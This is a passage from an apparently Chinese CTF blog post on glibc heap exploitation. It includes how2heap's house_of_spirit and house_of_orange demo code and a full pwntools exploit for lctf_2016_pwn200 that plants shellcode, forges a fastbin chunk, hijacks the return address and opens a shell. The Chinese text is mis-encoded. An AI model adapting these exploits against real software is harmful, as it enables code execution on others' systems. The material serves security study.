class="hljs-number">2</span>];<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Freeing the overwritten pointer.\n&quot;</span>);<br><br><span class="hljs-built_in">free</span>(a);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">1</span>], &amp;fake_chunks[<span class="hljs-number">2</span>]);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;malloc(0x30): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>));<br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap/house$ ./house_of_spirit<br>This file demonstrates the house of spirit attack.<br>Calling <span class="hljs-title function_">malloc</span><span class="hljs-params">()</span> once so that it sets up its memory.<br>We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.<br>This <span class="hljs-title function_">region</span> <span class="hljs-params">(memory of length: <span class="hljs-number">80</span>)</span> contains two chunks. The first starts at 0x7fffe5a3b378 and the second at 0x7fffe5a3b3b8.<br>This chunk.size of this region has to be 16 more than the <span class="hljs-title function_">region</span> <span class="hljs-params">(to accommodate the chunk data)</span> <span class="hljs-keyword">while</span> still falling into the fastbin <span class="hljs-title function_">category</span> <span class="hljs-params">(&lt;= <span class="hljs-number">128</span> on x64)</span>. The <span class="hljs-title function_">PREV_INUSE</span> <span class="hljs-params">(lsb)</span> bit is ignored by <span class="hljs-built_in">free</span> <span class="hljs-keyword">for</span> fastbin-sized chunks, however the <span class="hljs-title function_">IS_MMAPPED</span> <span class="hljs-params">(second lsb)</span> and <span class="hljs-title function_">NON_MAIN_ARENA</span> <span class="hljs-params">(third lsb)</span> bits cause problems.<br>... note that this has to be the size of the next <span class="hljs-built_in">malloc</span> request rounded to the internal size used by the <span class="hljs-built_in">malloc</span> implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work <span class="hljs-keyword">for</span> the <span class="hljs-built_in">malloc</span> parameter at the end. <br>The chunk.size of the *next* fake region has to be sane. That is &gt; 2*<span class="hljs-title function_">SIZE_SZ</span> <span class="hljs-params">(&gt; <span class="hljs-number">16</span> on x64)</span> &amp;&amp; &lt; av-&gt;<span class="hljs-title function_">system_mem</span> <span class="hljs-params">(&lt; <span class="hljs-number">128</span>kb by <span class="hljs-keyword">default</span> <span class="hljs-keyword">for</span> the main arena)</span> to pass the nextsize integrity checks. No need <span class="hljs-keyword">for</span> fastbin size.<br>Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7fffe5a3b378.<br>... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.<br>Freeing the overwritten pointer.<br>Now the next <span class="hljs-built_in">malloc</span> will <span class="hljs-keyword">return</span> the region of our fake chunk at 0x7fffe5a3b378, which will be 0x7fffe5a3b380!<br><span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">0x30</span>)</span>: 0x7fffe5a3b380<br></code></pre></td></tr></table></figure><h4 id="lctf-2016-pwn200"><a href="#lctf-2016-pwn200" class="headerlink" title="lctf_2016_pwn200"></a>lctf_2016_pwn200</h4><p>ä¸»è¦çš„æ”»å‡»æ€è·¯ï¼š</p><ol><li>å°†shellocodeå¸ƒç½®åˆ°æ ˆä¸Šå¹¶ä¸”æ³„éœ²rbpçš„å€¼ã€‚</li><li>åˆ©ç”¨number_readå‡½æ•°å¸ƒç½®next_sizeï¼ˆéœ€è¦æŸ¥çœ‹æ±‡ç¼–ï¼‰ã€‚</li><li>åœ¨ä¸»å‡½æ•°è°ƒç”¨sub_400A29()å‡½æ•°é‡Œå¸ƒç½®fake_chunkï¼Œå¹¶è¦†ç›–ptræŒ‡å‘fake_chunkçš„ç”¨æˆ·åŒºåŸŸã€‚</li><li>é‡Šæ”¾fake_chunkï¼Œç„¶åå†ç”³è¯·ï¼Œå°±ä¼šå¾—åˆ°è¿”å›åœ°å€é™„è¿‘çš„æ§åˆ¶æƒã€‚</li><li>ä¿®æ”¹è¿”å›åœ°å€ä¸ºshellcodeçš„åœ°å€ï¼Œæ”»å‡»æˆåŠŸã€‚</li></ol><p>WPå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&quot;./pwn200&quot;</span>)<br><span class="hljs-comment">#sh = remote(&quot;node4.buuoj.cn&quot;, 27191)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>shellcode = asm(shellcraft.amd64.linux.sh())<br><br><span class="hljs-comment">#leak</span><br>sh.recvuntil(<span class="hljs-string">&quot;who are u?&quot;</span>)<br>payload = shellcode<br>sh.send(payload)<br>sh.recvuntil(payload)<br>rbp = u64(sh.recv(<span class="hljs-number">6</span>) + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">2</span>)<br>log.info(<span class="hljs-string">&quot;rbp:&quot;</span> + <span class="hljs-built_in">hex</span>(rbp))<br><br>shellcode_addr = rbp - <span class="hljs-number">0x50</span><br>log.info(<span class="hljs-string">&quot;shellcode_addr:&quot;</span> + <span class="hljs-built_in">hex</span>(shellcode_addr))<br>fake_ptr = shellcode_addr - <span class="hljs-number">0x40</span><br>log.info(<span class="hljs-string">&quot;fake_ptr:&quot;</span> + <span class="hljs-built_in">hex</span>(fake_ptr))<br><br><span class="hljs-comment">#fake_chunk</span><br>sh.sendlineafter(<span class="hljs-string">&quot;give me your id ~~?&quot;</span>, <span class="hljs-string">b&#x27;65&#x27;</span>)<br>fake_chunk = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x41</span>) + p64(<span class="hljs-number">0</span>) + p64(fake_ptr)<br>sh.sendafter(<span class="hljs-string">&quot;give me money~&quot;</span>, fake_chunk)<br><br><span class="hljs-comment"># gdb.attach(sh, &quot;b *0x400A82&quot;)</span><br><span class="hljs-comment"># pause()</span><br><br><span class="hljs-comment">#free and malloc</span><br>sh.sendlineafter(<span class="hljs-string">&quot;choice : &quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>sh.sendlineafter(<span class="hljs-string">&quot;choice : &quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>sh.sendlineafter(<span class="hljs-string">&quot;how long?&quot;</span>, <span class="hljs-string">b&#x27;48&#x27;</span>)<br><br><span class="hljs-comment">#chang return_address</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p64(shellcode_addr)<br>sh.recv()<br>sh.sendline(payload)<br><br><span class="hljs-comment"># gdb.attach(sh)</span><br><span class="hljs-comment"># pause()</span><br><br><span class="hljs-comment">#pwn</span><br>sh.sendlineafter(<span class="hljs-string">&quot;choice : &quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure><h3 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house_of_orange"></a>house_of_orange</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  It requires a leak of the heap and the libc</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   This function is just present to emulate the scenario where</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   the address of the function system is known.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">winner</span> <span class="hljs-params">( <span class="hljs-type">char</span> *ptr)</span>;<br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br><br>&#123;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      The House of Orange starts with the assumption that a buffer overflow exists on the heap</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      using which the Top (also called the Wilderness) chunk can be corrupted.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      At the beginning of execution, the entire heap is part of the Top chunk.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      The first allocations are usually pieces of the Top chunk that are broken off to service the request.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Thus, with every allocation, the Top chunks keeps getting smaller.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      And in a situation where the size of the Top chunk is smaller than the requested value,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      there are two possibilities:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       1) Extend the Top chunk</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       2) Mmap a new page</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      If the size requested is smaller than 0x21000, then the former is followed.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br><br><br>    <span class="hljs-type">char</span> *p1, *p2;<br><br>    <span class="hljs-type">size_t</span> io_list_all, *top;<br><br><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;The attack vector of this technique was removed by changing the behavior of malloc_printerr, &quot;</span><br><br>        <span class="hljs-string">&quot;which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n&quot;</span>);<br><br>  <br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,&quot;</span><br><br>        <span class="hljs-string">&quot;https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n&quot;</span>);<br><br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Firstly, lets allocate a chunk on the heap.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br><br><br>    p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span><span class="hljs-number">-16</span>);<br><br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       The heap is usually allocated with a top chunk of size 0x21000</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       Since we&#x27;ve allocate a chunk of size 0x400 already,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       what&#x27;s left is 0x20c00 with the PREV_INUSE bit set =&gt; 0x20c01.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       it must also be page aligned at the end.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       Also, if a chunk that is adjacent to the Top chunk is to be freed,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       So that means that there are two conditions that must always be true.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        1) Top chunk + size has to be page aligned</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        2) Top chunk&#x27;s prev_inuse bit has to be set.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       What&#x27;s left is 0x20c01</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       Now, let&#x27;s satisfy the conditions</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       1) Top chunk + size has to be page aligned</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       2) Top chunk&#x27;s prev_inuse bit has to be set.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br><br><br>    top = (<span class="hljs-type">size_t</span> *) ( (<span class="hljs-type">char</span> *) p1 + <span class="hljs-number">0x400</span> - <span class="hljs-number">16</span>);<br><br>    top[<span class="hljs-number">1</span>] = <span class="hljs-number">0xc01</span>;<br><br><br><br>    <span class="hljs-comment">/* </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       Now we request a chunk of size larger than the size of the Top chunk.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       Malloc tries to service this request by extending the Top chunk</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       This forces sysmalloc to be invoked.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       In the usual scenario, the heap looks like the following</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          |------------|------------|------...----|</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          |    chunk   |    chunk   | Top  ...    |</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          |------------|------------|------...----|</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      heap start                              heap end</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       And the new area that gets allocated is contiguous to the old heap end.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       So the new size of the Top chunk is the sum of the old size and the newly allocated size.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       In order to keep track of this change in size, malloc uses a fencepost chunk,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       which is basically a temporary chunk.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       After the size of the Top chunk has been updated, this chunk gets freed.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       In our scenario however, the heap looks like</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          |------------|------------|------..--|--...--|---------|</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          |------------|------------|------..--|--...--|---------|</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     heap start                            heap end</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       In this situation, the new Top will be starting from an address that is adjacent to the heap end.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       So the area between the second chunk and the heap end is unused.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       And the old Top chunk gets freed.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       it gets added to list of unsorted bins.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       Now we request a chunk of size larger than the size of the top chunk.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       This forces sysmalloc to be invoked.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       And ultimately invokes _int_free</span><br><span 